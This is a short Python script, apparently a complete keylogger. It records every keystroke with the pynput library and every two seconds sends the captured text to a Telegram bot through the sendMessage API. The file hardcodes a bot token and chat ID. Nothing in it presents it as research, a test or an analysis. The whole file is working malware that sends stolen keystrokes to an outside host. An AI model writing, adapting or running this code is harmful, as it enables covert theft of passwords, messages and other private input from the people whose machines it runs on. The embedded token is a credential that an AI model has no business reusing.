from pynput import keyboard
# import keyboard
import threading
import requests


Token_api = "6818202233:AAG4GpF8DWZhKFp9kpgFESQq_4En4WJkp5A"
chat_id = "1579016671"

# url = f"https://api.telegram.org/bot{Token_api}/sendMessage?chat_id=1579016671&text={}"

# res = requests.get(url)
# print(res.json())

try:
    data = ""
    def on_key_press(event):
        global data
        try:
            data += event.char
        except:
            pass

    def send_logs():
        global data
        requests.get(f"https://api.telegram.org/bot{Token_api}/sendMessage?chat_id=1579016671&text={data}")
        data = ''
        threading.Timer(2, send_logs).start()

    # keyboard.on_press(on_key_press)
    # keyboard.wait()

    listener = keyboard.Listener(on_press=on_key_press)
    with listener:
        send_logs()
        listener.join()
    

except KeyboardInterrupt:
    print('Exiting...')
